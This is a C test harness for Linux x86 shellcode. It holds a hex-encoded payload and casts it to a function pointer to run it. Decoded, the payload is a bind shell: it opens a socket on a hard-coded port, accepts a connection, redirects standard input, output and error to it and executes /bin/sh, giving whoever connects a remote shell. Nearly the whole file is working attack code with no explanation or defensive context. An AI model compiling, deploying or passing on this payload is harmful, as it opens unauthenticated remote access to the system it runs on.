#include <stdio.h>

#define PORT "\x11\x5e"

char code[]=
"\x6a\x66\x58\x6a\x01\x5b\x99\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xfe\xc3\x52\x66\x68"PORT"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xfe\xc3\x52\x52\x56\x89\xe1\xcd\x80\x89\xc6\x89\xd1\x87\xde\xb0\x3f\xcd\x80\xfe\xc1\x80\xf9\x04\x75\xf5\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

main()
{
  int (*funct)();
  funct = (int (*)()) code;
  printf("shellcode\n\tSize = %d\n",strlen(code));
  (int)(*funct)();
}
